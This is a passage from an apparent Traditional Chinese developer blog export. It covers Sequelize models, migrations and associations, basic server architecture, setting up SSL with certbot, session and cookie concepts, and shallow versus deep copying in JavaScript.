Migration，它們是獨立的兩個東西。 關於 Model首先，Model 只是用來設定你要用 JS 操作時的資料結構，例如下面這個 Post 的 Model： 123456789101112131415161718192021222324'use strict';const { Model} = require('sequelize');module.exports = (sequelize, DataTypes) =&gt; { class Post extends Model { static associate(models) { // 加了這段後才可以用「include」這個屬性 Post.belongsTo(models.Category) } } // 可以對這個 Model 操作的資料結構 Post.init({ title: DataTypes.STRING, preview: DataTypes.TEXT, content: DataTypes.TEXT, CategoryId: DataTypes.INTEGER, isDeleted: DataTypes.BOOLEAN }, { sequelize, modelName: 'Post', }); return Post;}; 舉例來說，如果現在把 Model 的 title 拿掉，那麼就算你的 Table 裡面有 title 欄位，你也沒辦法用 JS 去存取，因為你沒把它定義在 Model 裡面，這就是我以前才踩到 這個 Bug 的原因。 關於 Migration關於 Migration 的意思，我自己是想成「這個檔案在對資料庫做什麼？（或是資料庫該怎麼變的腳本）」來記。 此話怎講？來舉個例子。 你一開始應該都會用 npx sequelize-cli model:generate --name Model 來建立 Model 的基本結構，這時候會 Sequelize 會順便產生一個 Migation，沒意外應該會叫做 &lt;date&gt;-create-&lt;model&gt;.js 的名稱，而它的內容應該會長得像這樣： 1234567891011121314151617181920212223242526272829'use strict';module.exports = { // db:migrate 執行這段 async up(queryInterface, Sequelize) { await queryInterface.createTable('Categories', { id: { allowNull: false, autoIncrement: true, primaryKey: true, type: Sequelize.INTEGER }, name: { type: Sequelize.STRING }, createdAt: { allowNull: false, type: Sequelize.DATE }, updatedAt: { allowNull: false, type: Sequelize.DATE } }); }, // db:migrate:undo 執行這段 async down(queryInterface, Sequelize) { await queryInterface.dropTable('Categories'); }}; 仔細看你會發現它其實只是一個用 JS 來執行 SQL 的內容，當執行 db:migrate 時會執行到 up；執行 db:migrate:undo 時會執行到 down。 所以這個 Migration 就可以看成是「到資料庫建立 table」的檔案，你要建 table 就執行 db:migrate，要刪除就執行 db:migrate:undo，就是這麼簡單！ 那為什麼常常會說它是一種「版本紀錄」？因為你一看 Migration 就能知道「在什麼時間點對資料庫做了什麼改變」，像上面的 &lt;date&gt;-create-&lt;model&gt;.js 就明顯代表「我在某個時間點對資料庫建立了一個 Table」。 舉例來說，如果我現在對 Table 新增了一些欄位或是修改，那我也會有新的 migration，可能叫做 modify_users_add_new_fields 之類的，一目了然。 當你有一大堆 Migation 的時候可能會像這樣： 12345678910111213141520190329025948-create-user.js -&gt; 建立 user 這個 table20190329054042-create-announcement.js -&gt; 建立 announcement 這個 table20190329071502-create-progression.js -&gt; 建立 progression 這個 table20190329080415-create-report.js -&gt; 建立 report 這個 table20200328083208-update-user-role.js -&gt; 修改 user 這個 table20200329094946-create-homework.js -&gt; 建立 homework 這個 table20200423131738-update-user-status.js -&gt; 修改 user 這個 table20200503085305-update-homeworks-like.js -&gt; 修改 homework 這個 table20210316055432-create-unit_permissions.js -&gt; 建立 unit_permissions 這個 table20210316063420-create-note.js -&gt; 建立 note 這個 table20210405132446-create-syllabus.js -&gt; 建立 syllabus 這個 table20210530085648-update-user-transaction.js -&gt; 修改 user 這個 table20210530090402-create-transaction.js -&gt; 建立 transaction 這個 table20210804121734-create-article.js -&gt; 建立 article 這個 table20210804121758-create-comment.js -&gt; 建立 comment 這個 table （引自 Lidemy 的學習系統） 反之，如果沒有 Migration 的話，我就透過 git 的 commit 紀錄一個個去看 Model 的內容是在什麼時候被改的，非常非常非常麻煩吧？所以這就是 Migration 的用途。 以上就是 Model 跟 Migration 的差別，不知道我說清楚了沒有，但希望能幫助跟我一樣卡很久的人解惑。","link":"/2022/03/31/sequelize-migration-and-model-difference/"},{"title":"Sequelize 隨筆記","text":"真的隨筆記。 Table 做壞了想重新開 先撤銷所有的 migation 1npx sequelize-cli migrate:undo:all 重新建立 1npx sequelize-cli db:migrate 一些設定 Model 時會用到的屬性12345autoIncrement: true // 遞增allowNull: false // 空值primaryKey: true // 主鍵unique: true // 唯一鍵defaultValue: false // 初始值（布林值） 一些跟 Model 操作相關的 methods找總數量1234567891011Post.count({ where: { title: '123' }}).then(post =&gt; { console.log('success', post);}).catch(err =&gt; { console.log('failed', err);}) 對被 include 的 model 做 where 查詢12345678const category = await Category.findOne({ where: { id }, include: [{ model: Post, // 寫在這裡 where: { isDeleted: 0 }, }],}); 對被 include 的 model 做 order 排序12345678910const category = await Category.findOne({ where: { id }, // 記得是寫在外面不是裡面： // Model 名稱、根據什麼來排序、升冪還降冪 order: [[Post, 'id', 'DESC']], include: [{ model: Post, where: { isDeleted: 0 }, }],}); 對被 include 的 model 做 offset 和 limit建議加上一個 separate 的屬性，不然巢狀有時候會有 bug： 1234567891011const category = await Category.findOne({ where: { id }, include: [{ model: Post, where: { isDeleted: 0 }, separate : true, // &lt;-- 這個很重要 order: [['createdAt', 'DESC']], limit, offset }],});","link":"/2022/03/30/sequelize-note/"},{"title":"使用 Sequelize 的事前準備","text":"好用的東西，不過得多練習。 簡述基本流程大致都是這樣： 連線到資料庫 定義 Table 的 Schema，（Sequelize 會用 Model 來稱呼） 同步到資料庫（真正新建 Table 的動作） 連線到資料庫附註：一個 Sequelize 就代表一個資料庫，可以這樣記。 12345678910111213141516171819// Sequelize: 用來 new 一個連線資料庫的 instance// DataTypes: 用來設定 Schema 的內容const { Sequelize, DataTypes } = require('sequelize');// 基本資訊const sequelize = new Sequelize('database', 'username', 'password', { host: 'localhost', dialect: 'mariadb'});// 檢查連線狀態~async function checkConnection () { try { await sequelize.authenticate(); console.log('Connection has been established successfully.'); } catch (error) { console.error('Unable to connect to the database:', error); }}() 定義 Schema附註： Sequelize 裡會用「Model」來表示 table Sequelize 預設就會有「時間軸」的欄位，不用自己寫 STRING 的預設值是 VARCHAR(255) 123456789101112// 定義一個 User 的 table（大寫是命名慣例）const User = sequelize.define('User', { // 設定欄位資訊 firstName: { type: DataTypes.STRING, allowNull: false }, lastName: { type: DataTypes.STRING // allowNull defaults to true }}) 詳細的結構參考下面： String： 1234567DataTypes.STRING // VARCHAR(255)DataTypes.STRING(1234) // VARCHAR(1234)DataTypes.STRING.BINARY // VARCHAR BINARYDataTypes.TEXT // TEXTDataTypes.TEXT('tiny') // TINYTEXTDataTypes.CITEXT // CITEXT PostgreSQL and SQLite only.DataTypes.TSVECTOR // TSVECTOR PostgreSQL only. Boolean： 1DataTypes.BOOLEAN // TINYINT(1) Number： 123456789101112131415161718DataTypes.INTEGER // INTEGERDataTypes.BIGINT // BIGINTDataTypes.BIGINT(11) // BIGINT(11)DataTypes.FLOAT // FLOATDataTypes.FLOAT(11) // FLOAT(11)DataTypes.FLOAT(11, 10) // FLOAT(11,10)DataTypes.REAL // REAL PostgreSQL only.DataTypes.REAL(11) // REAL(11) PostgreSQL only.DataTypes.REAL(11, 12) // REAL(11,12) PostgreSQL only.DataTypes.DOUBLE // DOUBLEDataTypes.DOUBLE(11) // DOUBLE(11)DataTypes.DOUBLE(11, 10) // DOUBLE(11,10)DataTypes.DECIMAL // DECIMALDataTypes.DECIMAL(10, 2) // DECIMAL(10,2) 同步到 Database上面都只是事前準備，還沒有真正去操作資料庫，所以這一步才算是真的執行 SQL 指令。 1234~async function sync() { // 根據前面定義的 Model 來同步 await sequelize.sync();}() 如果之後想要改 Schema，就跟剛剛一樣的流程： 先修改 Model 再執行一次 sync","link":"/2022/03/25/sequelize-preparation/"},{"title":"Sequelize 建立關聯","text":"把你我之間連起來。 建立方式假設我有兩個 table： 12345678910111213141516171819// 定義一個 User 的 tableconst User = sequelize.define('User', { // 設定欄位資訊 firstName: { type: DataTypes.STRING, allowNull: false }, lastName: { type: DataTypes.STRING }})// 定義一個 Comment 的 tableconst Comment = sequelize.define('Comment', { // 設定欄位資訊 content: { type: DataTypes.STRING, allowNull: false }}) 接著就可以用一些 method 來把它們關聯起來： 1234// 一個 user 對應到多個 comment（一對多）User.hasMany(Comment);// 一個 comment 屬於一個 user（一對一）Comment.belongsTo(User); 通常一個 has 就會對應到一個 belongsTo 所以可以有這幾種寫法： 一對一：hasOne 對 belongsTo 一對多：hasMany 對 belongsTo（最常用） 多對多：belongsToMany 總之，只要你建立了關聯，Sequelize 就會自動幫你在關聯的 table 加上「外鍵（Foreign key）」，預設值是Model名稱 + Id。 如果你想自定義的話可以在設定時傳入 Option： 123User.hasMany(Comment, { foreignKey: 'yoyoyoUserId'}); 合併資料接著就是最重要的合併，直接來看怎麼用。假設我想撈出 username=peanu 的所有留言： 12345678910~async function () { const result = await User.findOne({ where: { firstName: 'peanu' }, // 把要合併的 Model include 進來 include: [Comment] }) console.log(JSON.stringify(result, null, 4));}() 輸出結果： 123456789101112131415161718192021222324{ \"id\": 2, \"firstName\": \"peanu\", \"lastName\": \"qq\", \"createdAt\": \"2022-03-24T13:43:16.000Z\", \"updatedAt\": \"2022-03-24T14:10:43.000Z\", // peanu 的所有留言 \"Comments\": [ { \"id\": 2, \"content\": \"yoyoyo\", \"createdAt\": \"2022-03-24T15:06:52.000Z\", \"updatedAt\": \"2022-03-24T15:06:52.000Z\", \"UserId\": 2 }, { \"id\": 3, \"content\": \"hello\", \"createdAt\": \"2022-03-24T15:07:03.000Z\", \"updatedAt\": \"2022-03-24T15:07:03.000Z\", \"UserId\": 2 } ]} Sequelize 就會自動新增一個 Comments 的欄位，代表這個人的所有留言。 當然也可以反過來，假設我想撈出某個 Comment 的 User 資料： 12345678910~async function () { const result = await Comment.findOne({ where: { id: 6 }, // 一樣用 include，只是身分互換 include: [User] }) console.log(JSON.stringify(result, null, 4));}() 輸出結果： 1234567891011121314{ \"id\": 6, \"content\": \"bobo\", \"createdAt\": \"2022-03-24T15:07:36.000Z\", \"updatedAt\": \"2022-03-24T15:07:36.000Z\", \"UserId\": 1, \"User\": { \"id\": 1, \"firstName\": \"John\", \"lastName\": \"hahaha\", \"createdAt\": \"2022-03-24T13:29:05.000Z\", \"updatedAt\": \"2022-03-24T14:19:39.000Z\" }} 這樣我們就可以知道 id=6 的留言是 John 留的了。","link":"/2022/03/25/sequelize-relation/"},{"title":"Sequelize 透過 Migration 來修改 Table 資訊","text":"花了一點時間才理解這個流程。 簡述不知道你有沒有和我一樣，曾經想要對 Table 新增欄位，所以就直接這樣子做： 12345678910111213141516171819202122232425262728293031// 20220331071729-create-category.js'use strict';module.exports = { async up(queryInterface, Sequelize) { await queryInterface.createTable('Categories', { id: { allowNull: false, autoIncrement: true, primaryKey: true, type: Sequelize.INTEGER }, name: { type: Sequelize.STRING }, isDeleted: { // &lt;- 新增這個欄位 type: Sequelize.BOOLEAN }, createdAt: { allowNull: false, type: Sequelize.DATE }, updatedAt: { allowNull: false, type: Sequelize.DATE } }); }, async down(queryInterface, Sequelize) { await queryInterface.dropTable('Categories'); }}; 這時候你去執行 npx sequelize-cli db:migrate 會發現沒有用： 123Loaded configuration file \"config\\config.json\".Using environment \"development\".No migrations were executed, database schema was already up to date. 這種時候該怎麼辦？你有兩條路可以走： 執行 db:migrate:undo，接著再重新跑一次 db:migrate 執行 db:migration:create，寫一個新的 migration 來處理 這兩個差在第一種會直接把 Table Drop 掉（通常是這樣，但實際上看內容決定），你原本存的資料就直接沒了，而第二種就是為了避免這個問題的解決方案，也是我這篇要講的解法。 假設我目前的 Table 長這樣： 現在我想對新增一個 isDeleted 欄位，所以就照剛剛說的，我先下指令來生一個新的 Migration 出來： 12# 命名慣例最好是 update create add .. 之類的當作開頭sequelize migration:create --name 'add-isDeleted-to-category' 接著產生的檔案內容會是這樣： 123456789101112131415161718192021'use strict';module.exports = { async up (queryInterface, Sequelize) { /** * Add altering commands here. * * Example: * await queryInterface.createTable('users', { id: Sequelize.INTEGER }); */ }, async down (queryInterface, Sequelize) { /** * Add reverting commands here. * * Example: * await queryInterface.dropTable('users'); */ }}; 簡單來說，就是在裡面寫你想執行的操作： 12345678910111213141516171819202122'use strict';module.exports = { async up (queryInterface, Sequelize) { // 用 addColumn 新增 await queryInterface.addColumn( 'Categories', // table name 'isDeleted', // new field name // dataType { type: Sequelize.BOOLEAN, allowNull: false, defaultValue: false } ) }, async down (queryInterface, Sequelize) { // 用 removeColumn 新增 await queryInterface.removeColumn('Categories', 'isDeleted'); }}; 記得 up 和 down 之間要有對應關係，我在 up 裡做新增，down 就應該該做移除，這樣之後跑指令的時才不會出錯。 接下來就跟一開始一樣，下指令去跑 migration： 1npx sequelize-cli db:migrate 這樣就完美的保留資料，也新增了欄位，可喜可賀，可喜可賀。 之後如果又不想要這個欄位的話也很簡單，只要執行： 1npx sequelize-cli db:migrate:undo --name 20220331082106-add-isDeleted-to-category.js 就大功告成啦。 但是這樣還沒有完成，還有一件事情得做故意用這麼大的字就是因為這件事很重要，絕對不能忘記。 總而言之，不要忘記 Model 的存在，當你用 JS 來操作資料庫時都是透過 Model 來執行的，所以雖然你剛剛透過 Migration 在 Table 新增了欄位，但這並不代表 Model 的資料結構會跟著自動更新，所以請務必記得： 跑完 Migration 後要再去重新設定 Model 的資料結構 跑完 Migration 後要再去重新設定 Model 的資料結構 跑完 Migration 後要再去重新設定 Model 的資料結構 這很重要，真的。 如果你沒有這樣做的話，就會有這個問題： 1234567const { Category } = require('./models');~async function () { // 撈出所有資料 const categories = await Category.findAll(); console.log('result', JSON.stringify(categories, null, 4));}() 輸出結果： 12345678910111213// 沒有把 isDeleted 撈出來Executing (default): SELECT `id`, `name`, `createdAt`, `updatedAt` FROM `Categories` AS `Category`;result [ { \"id\": 1, \"name\": \"JavaScript\", \"createdAt\": \"2021-03-31T00:00:00.000Z\", \"updatedAt\": \"2021-03-31T00:00:00.000Z\" // 消失的 isDeleted }] 所以再說一次，記得去改 Model 的資料結構： 12345678910111213141516171819'use strict';const { Model} = require('sequelize');module.exports = (sequelize, DataTypes) =&gt; { class Category extends Model { static associate(models) { Category.hasMany(models.Post); } } Category.init({ name: DataTypes.STRING, isDeleted: DataTypes.BOOLEAN, // &lt;- 補上剛剛加的欄位 }, { sequelize, modelName: 'Category', }); return Category;}; 一定要確保 Model 跟資料庫的狀態是同步的，在用的時候才不會出問題。 附註 如果有改 Migration 的名稱的話，記得到資料庫的 sequelizemeta 把原本的名稱也改掉，不然執行指令時會出錯。 想知道其他操作可以參考 這篇，主要就是換個 method 來執行而已，基本結構都大同小異。","link":"/2022/03/31/sequelize-use-migration/"},{"title":"伺服器架構","text":"後端的世界也是博大精深。 簡述這邊會補充一些後端 Server 如何運作的相關知識。看完後希望你能知道這些關鍵字的涵義： NAT 是什麼 Load Balance 是什麼 Replication 是什麼 NAT（Network Address Translation）一個公司裡面通常有很多台 Server 在跑，可是你實際跟 Server 連線時看起來都只有連到一個對象，這是為什麼呢？ 其實這邊跟「內網」和「外網」的概念很像，公司內的 Server 彼此會透過內網 IP 來溝通，但對外要透過一台「機器」來跟外面的網路世界做溝通，這個機器就是「NAT」。 這裡的 例子 不錯，節錄一段內容： 假設台大電機系的網管人員將網路切割為內部與外部，內部網路的網址設定為 192.168.1.1、192.168.1.2、192.168.1.3；而外部網路的網址為 140.112.66.88，則 NAT 伺服器的功能就是更改封包表頭的傳送端 IP 位址與接收端 IP 位址。 所以呢，從外網沒辦法看到裡面有幾台 Server，而內網也看不到外面的世界。 最後附個懶人包，NAT 的功能有什麼： 重新封裝 IP，例如 192.168.1.1 變成 140.112.66.88 封包過濾，可以攔截一些惡意封包 負載均衡，把資源分散到不同 Server，減輕負擔 負載均衡（Load Balance） 當流量很大的時候，把流量分散到不同的 Server，減輕負擔。 好處有： 減輕 Server 負擔 如果 PHP01 爆了，還有 PHP02 能撐 資料庫 Replication 讀寫分離、從屬架構 簡單來說，可以把資料庫建立從屬關係 Master 負責處理「寫入資料」的資料庫 Slave 負責處理「讀取」資料的資料庫 當你在寫資料到 Master 時，MySQL 會透過 Replication（複製）機制，讓 Master 和所有 Slave 之間的資料同步。 這樣的好處是資料庫負擔不會那麼重，因為「讀跟寫是分開的」。另外雖然上面的圖只畫出一台，但實際上 Master 和 Slave 可以有多個（應該啦），所以又可以在透過這種方式來降低負擔。 資料庫高可用性 High Availability 其實就是剛剛的從屬架構來做延伸： 假設 Master 壞掉了，就先把流量轉給 Slave，利用這段期間修復 Master。 總之呢，不管是前面提的 Load Balance 還是 Replication，重點都只有一個： 永遠要有兩台以上的機器來預防突發狀況 記住這點就好了。","link":"/2022/03/09/server-architecture/"},{"title":"設定 SSL 憑證","text":"結果也沒那麼複雜。 簡述本來想說想說 SSL 要錢，加上我懶所以沒打算弄。不過後來看到 同學寫的紀錄 裡面正好提到： 有一個網站叫做 lets encrypt 可以免費頒發 SSL 的證書，而 certbot 就是可以幫你自動連到 lets encrypt 申請證書，甚至在過期的時候也會自動幫你再申請！！簡直是 nice 到不行 所以就來幫自己的網站補上 SSL 憑證了。 步驟官網其實就有 教學步驟 了，不過保險起見還是寫一下好了： 安裝 snapd（EC2 的 Ubuntu 已經有內建，所以這步略過） 更新 snapd：sudo snap install core; sudo snap refresh core 安裝 Certbot：sudo snap install --classic certbot 確認 Cerbot 指令可以用：sudo ln -s /snap/bin/certbot /usr/bin/certbot 設定要使用 SSL 的網址：sudo certbot --apache 重新啟動 Cerbot：sudo certbot renew --dry-run 最後就能看到有鎖頭囉！ 補充－後來新增的子網域也想加上 SSL 的話加上 -d &lt;新的子網域&gt;： 1sudo certbot --apache -d www.example.com 這樣就行囉。不確定不加的話是不是會自動跳選項給你選，之後有機會再試看看吧。","link":"/2022/03/09/set-ssl/"},{"title":"Session 與 Cookie 是什麼？","text":"最近想要實作「收藏到我的最愛」的功能。 提到這個功能，我腦中第一個想到的就是「Web Storage API」。但正當我打算找相關的資料來看時，突然又想到好像還有個叫「Cookie / Session」的玩意兒？ 既然都決定要學了，那不如就一次弄清楚吧，所以這次參考了 Huli 的 文章 想來做一份關於「Cookie / Session」的筆記。 認識無狀態要了解為什麼需要 Session 與 Cookie 之前，要先知道 HTTP 是一種「無狀態」的協議。 什麼叫無狀態？直接看例子： 1234瀏覽器：安安，我是 PeaNu，我現在要登入哦Server：好，你是 PeaNu，你成功登入了。瀏覽器：我是PeaNu，我想看看我的購物車的商品Server：不好意思，你哪位？ 你看，每當你想要做下一步的時候，Server 就已經忘記你是誰了。換句話說，每一次的 Request 都是不相關的。 PeaNu 登入時是一個 Request，要查看購物車商品也是一個 Request，但不管 PeaNu 發了幾次 Request，對 Server 而言，每一次都是一個全新的 Request，因為 Server 沒辦法記住當時的「狀態」。 解救失憶症的好夥伴 Session「Session」是一個可以讓 Server 記住每一次 Request 狀態的機制。 實作 Session 的方式有很多種，其中一種方法是「網址」： 12345瀏覽器：我要買蘋果，把蘋果加到購物車 ( market.tw?item1=apple )瀏覽器：我要買豬排，把豬排加到購物車 ( market.tw?item1=apple&amp;item2=cutlet )瀏覽器：我要結帳Server：查看網址後得知，item1=apple（蘋果），item2=cutlet（豬排）Server：哦！你要買蘋果跟豬排。 另外一種方式是利用 「Cookie」。 每個瀏覽器都有 Cookie ，一個用來儲存資料的東西。 現在假設每個瀏覽器都隨身攜帶一個幸運餅乾（幸運餅乾是美國的一種餅乾，裡面通常會塞著一張紙條，可以參考這裡）： 123456789101112瀏覽器：嗨，給我一個豬排Server：好，幸運餅乾借我，我儲存一下資料Server：（把紙條塞到幸運餅乾裡）（set-Cookie: item1=apple)Server：OK。瀏覽器：阿，我還想要一個豬排Server：好，幸運餅乾借我，我儲存一下資料Server：（把紙條塞到幸運餅乾裡）（set-Cookie: item2=cutlet)瀏覽器：好了，我要結帳（帶著幸運餅乾）Server：把幸運餅乾拆開。（找到 apple 跟 cutlet）Server：好的，你的蘋果跟豬排是 87 元哦！ 從 Cookie-based 到 Session Identifier在前面的例子裡，我們把資料都儲存在瀏覽器的 Cookie 中，這個方法稱為「Cookie-based session（以 Cookie 為基礎的 Session）」 在理解什麼是「Session Identifier」之前，我們可以先思考一下使用 Cookie 有什麼問題？為什麼會有 Session Identifier 的出現？ 有一件很重要的事情要知道，那就是「Cookie 是可以被竄改的」： 1234瀏覽器：嗨，我要買咖啡，寄 10 杯Server：好，幸運餅乾借我，我儲存一下資料Server：（把紙條塞到幸運餅乾裡）（set-Cookie: coffee=10)Server：OK，歡迎下次再來。 這個時候，如果瀏覽器自己修改 Cookie 的值，就會變成這樣： 123456瀏覽器：（對幸運餅乾的紙條動手腳，改成 coffee = 20）瀏覽器：嗨，我來領我的咖啡Server：好，幸運餅乾借我確認一下Server：把幸運餅乾拆開（找到 coffee = 20）Server：你目前有 20 杯咖啡，你想要領幾杯呢？瀏覽器：今晚我想來點...星巴克的巧克力可可碎片星冰樂不加巧克力。咳...我是說， 1 杯就好 為了解決 Cookie 被擅自竄改的問題，第一個會直覺想到的方法是：把 Cookie 中的資料做加密處理。 所以 Server 在設置 Cookie 的時候，可以先用一個加密的方式來產生資料，再把加密過後的資料存到 Cookie 裡： 12345瀏覽器：嗨，我要買咖啡，寄 10 杯Server：好，幸運餅乾借我，我儲存一下資料Server：（把紙條塞到幸運餅乾裡）（set-Cookie: coffee=ED85B89167A84B631C10B046B5FB7FC0)Server：OK，歡迎下次再來。瀏覽器：GG 這時候如果瀏覽器想要竄改 Cookie 的值，就得先破解這套加密的演算法，才有辦法做修改。 這樣的做法確實解決了 Cookie 被擅自竄改的問題，但這依舊屬於 Cookie-based session。 這樣子做有什麼問題嗎？實際上是有的，因為 Cookie 能夠儲存的資料量是有限的（4KB），所以當要儲存在 Cookie 的資料越來越多時，很容易就會超出上限值。 為了解決這個問題，「Session Identifier」就誕生了。 它背後的原理是這樣子： Server 現在不把資料儲存在瀏覽器的 Cookie 了，而是都儲存在 Server 這邊。至於 Cookie 則只會儲存一個用來辨識身分的識別碼，透過這個識別碼，Server 就可以在自己的記事本上找到對應的資料。 1234瀏覽器：嗨，我要買咖啡，寄 10 杯Server：好，幸運餅乾借我，我儲存一下資料Server：（把紙條塞到幸運餅乾裡）（set-SessionId: A59Uhe7I94J330mN )Server：（在自己的記事本上寫下：A59Uhe7I94J330mN : coffee=10） 當下一次瀏覽器來領咖啡時： 12345瀏覽器：嗨，我來領我的咖啡Server：好，幸運餅乾借我確認一下哦Server：把幸運餅乾拆開（找到 A59Uhe7I94J330mN )Server：打開自己的記事本做查閱（找到 A59Uhe7I94J330mN : coffee=10）Server：好的，你目前有 10 杯咖啡，你想要幾杯呢？ 儲存在 Cookie 中的識別碼稱為「SessionID」。 這樣子就解決了 Cookie 大小限制的問題，因為不論有多少資料要儲存，cookie 唯一要儲存的資料都只有識別碼（SessionId）。 不過有一點要特別提醒的是：Server 只認 SessionId 不認人。也就是說，不管是誰，只要他的 Cookie 中的 SessionId 可以對應到 Server 中儲存的資訊，那他就可以取得相對應的資料。 總結最後，試著問自己這些問題，看看自己有沒有真的理解： HTTP 的無狀態是什麼意思？ Session 是用來做什麼的？ 怎麼實作 session？ Cookie-base Session 跟 Cookie 有什麼差異？ Cookie-base Session 會有什麼問題，session Identifier 又是用來解決什麼問題？ 答案都在內文裡了，如果忘記了就在去裡面找答案吧。 參考資料MDN-Web Storage API白話 Session 與 Cookie：從經營雜貨店開始","link":"/2021/12/08/session-and-cookie/"},{"title":"再來談談－淺拷貝與深拷貝的雷","text":"又被雷到了。 簡述這是最近在寫 React 時踩到的雷，本來還以為我對拷貝問題沒有太大的障礙才對，結果還是太大意惹，所以重新回來複習一遍。 情境這邊用一個例子來舉例會比較好懂一點： 1const a = [{value: 10}] 假設我想要多加一個變數 b，他的值要是 [{value: 20}]，那你會怎麼做？ 當時的我是這樣做的： 123const a = [{value: 10}]const b = [...a]b[0].value = 20 如果你已經看出問題的話，幹得好！沒有的話也沒關係，我們一步一步來解析。 首先這個作法當然是錯的，你可以試著把 a 跟 b 印出來看就會發現兩個都會是 [{value: 20}]，但重點是為什麼會這樣？ 如果你要看比較詳細的解說，可以參考這篇 該來談談淺拷貝（Shallow copy）與深拷貝（Deep copy）了，這邊只會大概講一下原因。 簡單來說，當我用 [...a] 的時候，你可以把我複製出來的東西想成是這樣： 1const b = [reference] 所以如果你這時候用 b[0] === a[0]，答案就會是 true，因為他們是同個 reference。這也就是為什麼 b[0].value = 20 也會改到 a 的原因。 雖然現在講的很有把握，不過當下還真的蠻疑惑為什麼會有這樣的結果。 正確的做法總而言之，正確的做法就是避免掉淺拷貝帶來的問題，所以有兩種方式，先來看第一種： 123456const a = [{value: 10}]const b = JSON.parse(JSON.stringify(a))b[0].value = 20console.log(a) // [{value: 10}]console.log(b) // [{value: 20}] 第二種： 1234567const a = [{value: 10}]const b = a.map(item =&gt; { return {...item, value: 20}})console.log(a)console.log(b) 第一種是利用 JSON 轉換的方式，第二種是先利用 map 遍歷 Object，每一圈都做淺拷貝（因為只有一層所以不會是 reference），再把要改的部分修正。 兩種方法其實都行，不過我是聽說第一種會有效能問題，所以還是都用第二種居多。","link":"/2022/06/14/shallow-and-deep-copy-problem/"},{"title":"該來談談淺拷貝（Shallow copy）與深拷貝（Deep copy）了","text":"以前沒有想過我會被這個東西給雷到。 簡述在談這兩個東西以前，先來聊聊我是怎麼踩到這個地雷的吧。 這是我當初在做「五子棋」的時所發生的情境： 為了儲存棋盤的狀態，我開了一個像這樣的資料結構： 1234567const pieces = [ [null, null, null, null, ...], [null, null, null, null, ...], [null, null, null, null, ...], [null, null, null, null, ...], ...] 簡單來說就是一個用來表示 19 x 19 棋盤的二維陣列，第一層代表 y 軸，第二層代表 x 軸，所以 pieces[0][0] 代表第一排的第一支棋，piecesp[1][0] 代表第二排的第一支棋，以此類推。 當時要做的事情很簡單，就是在下棋時根據「被點擊的座標位置」來更新 state。 會講 state 這個詞就暗示我當時是用 React 來寫的，所以並不能用這種 piecesp[y][x] 的方式來改，而是得產生一個新的 state 才行。 所以，最簡單的作法就是先複製一份原本的陣列，再把要改的地方改掉就好，結果我就寫了這玩意兒： 123456// 複製一份原本的陣列const newPieces = pieces.slice();// 改成黑棋或白棋的狀態newPieces[changedY][changedX] = isBlackNext ? \"black\" : \"white\";// 更新 statesetPieces(newPieces); 接著就出現了這幅詭異的現象： 當時的我感到懷疑人生，明明我給的座標就是 newPieces[0][18]（最右上角），怎麼會所有的 newPieces[n][18]（整個直排） 都一起改變了？ 找了半天找不到原因，甚至後來直接把值寫死來測試，但還是得到一樣的結果，整個人都不好了（X 直到後來查了一些資料以後，我才理解原來是「淺拷貝」在背後作怪。 淺拷貝與深拷貝的差別在講差別之前，我們可以先來看一下淺拷貝的範例，理解它會產生什麼問題： 12345678const array = ['A', 'B', ['C']];// 最簡潔的淺拷貝（展開運算子）const copyArray = [...array]; // 可以想成是把 'A', 'B', ['C'] 放到 [] 裡// 接著把巢狀的部分更新copyArray[2][0] = 'Z';console.log(copyArray); // ['A', 'B', ['Z']];console.log(array); // ??? 不了解淺拷貝的話就會很直覺的說： 「當然是 ['A', 'B', ['C']] 呀！」 可是真的是這樣嗎？其實正確答案是：['A', 'B', ['Z']] 如果你試著把這兩個值做比對的話，就會發現結果出乎意料： 1console.log(copyArray[2] === array[2]); // true 要記得像 Array 或 Object 這種 non-primitive 的變數儲存的都是「Reference」，不是真正的值，所以當你去改兩個指向同一個 reference 的變數，當然就會兩個一起改變。 好像拉得有點遠，所以能告訴我淺拷貝是什麼了嗎？ 淺拷貝就是只能複製第一層的陣列或物件 淺拷貝就是只能複製第一層的陣列或物件 淺拷貝就是只能複製第一層的陣列或物件 以剛剛的例子來說，如果你這樣子做： 12console.log(copyArray === array) // falseconsole.log(copyArray[2] === array[2]) // true 會發現如果只比較第一層的陣列，得到的結果會是 false，代表兩個東西是不一樣的，因為淺拷貝本來就可以複製「第一層」的東西。但如果是第二層的話就沒辦法了，它還是會指向同一個 Reference，所以第二個結果才會是 true。 怎麼分辨淺拷貝與深拷貝？這部分就要靠你自己搜尋了，Google 一下就蠻多答案了，總之大部分你常用的 slice、map 或 ... 都屬於淺拷貝。 而深拷貝因為還蠻麻煩的，所以如果你跟我一樣沒被雷過的話可能根本沒用過深拷貝這玩意兒。 總之呢，深拷貝大多數會依賴套件來做，因為它比較複雜一點，這邊隨便貼幾個我在網路上找到的範例： 1. 透過 jQuery 的 $.extend： 123456789let obj = {name: '王康寶', age:{child: 18}}let copy = $.extend(true, {}, obj); //使用 jquery.extendcopy.name = '盧卡斯';copy.age.child = 99; //更改 copy.age.child 的值//輸出console.log(obj); //{name: \"王康寶\", age:{child: 18}}console.log(copy); //{name: \"盧卡斯\", age:{child: 99}} 2. 用 lodash（也是某個套件） 123456789let obj = {name: '王康寶', age:{child: 18}}let copy = _.cloneDeep(obj); //使用 lodash.cloneDeepcopy.name = '盧卡斯';copy.age.child = 99; //更改 copy.age.child 的值//輸出console.log(obj); //{name: \"王康寶\", age:{child: 18}}console.log(copy); //{name: \"盧卡斯\", age:{child: 99}} 最後是一個純 JavaScript 的方式，就拿我們剛剛的範例來做吧： 12345678const array = ['A', 'B', ['C']];const copyArray = JSON.parse(JSON.stringify(array));copyArray[2][0] = 'Z'; // 更新值console.log(copyArray); // ['A', 'B', ['Z']]console.log(array); // ['A', 'B', ['C']]console.log(array[2] === copyArray[2]); // false 這方法還蠻妙的，不過要注意沒辦法用內容有 function 的值，而且效能也不是那麼好。 最後的最後所以回到一開始五子棋的例子，為什麼在我點了 newPieces[0][18] 以後會把所有的 newPieces[n][18] 給更新？ 不如直接寫個範例來測試吧： 12345678910111213const array = [ [null, null, null, null, null, null, null, null, null, null], [null, null, null, null, null, null, null, null, null, null], [null, null, null, null, null, null, null, null, null, null], [null, null, null, null, null, null, null, null, null, null],];const shallowCopy = [...array];// 把第一排最後面的值改掉shallowCopy[0][9] = 'black';console.log(shallowCopy);console.log(array); 結果就會發現兩個 array 的第一排最後一個值都同時被改了。 這邊要先提醒，我們在 React 裡複製原本的 state 如果是淺拷貝，代表改東西的話也會動到原本的 state。 這可麻煩大了，畢竟 React 非常強調 state 